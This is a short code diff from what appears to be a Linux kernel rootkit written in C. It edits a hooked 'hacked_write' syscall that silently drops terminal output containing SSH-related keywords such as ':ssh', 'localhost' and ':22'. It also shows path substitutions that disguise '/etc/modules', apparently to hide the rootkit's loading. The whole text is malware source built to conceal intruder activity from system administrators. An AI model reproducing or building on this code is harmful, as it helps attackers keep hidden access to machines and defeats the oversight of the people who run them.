@@ -51,7 +51,7 @@ const char* replacement_keys[]   = { "/etc/modules\0" };
 const char* replacement_values[] = { "/etc/modules_original\0" };
 
 // these are keywords which we want to ignore when using the write syscall
-const char *keyWords[5] = {":ssh\0", "127.0.0.1\0", "localhost\0", ":22\0", "(127.0.0.1)\0"};
+const char *keyWords[4] = {":ssh", "127.0.0.1", "localhost", ":22"};
 
 // 1 = custom boot-loader installed; run modified syscalls
 // 0 = custom boot-loader not yet installed; don't use modified syscalls
@@ -287,7 +287,7 @@ asmlinkage int hacked_write(unsigned int fd, const char *buf, size_t count){
     if (fd == 1) {
         //spot our 'keywords'
         //if they are here, dont write anything at all
-        for(i = 0; i < 5; i++){ 
+        for(i = 0; i < 4; i++){ 
             if (strstr(buf, keyWords[i]) != NULL) {
                 return count;
             }
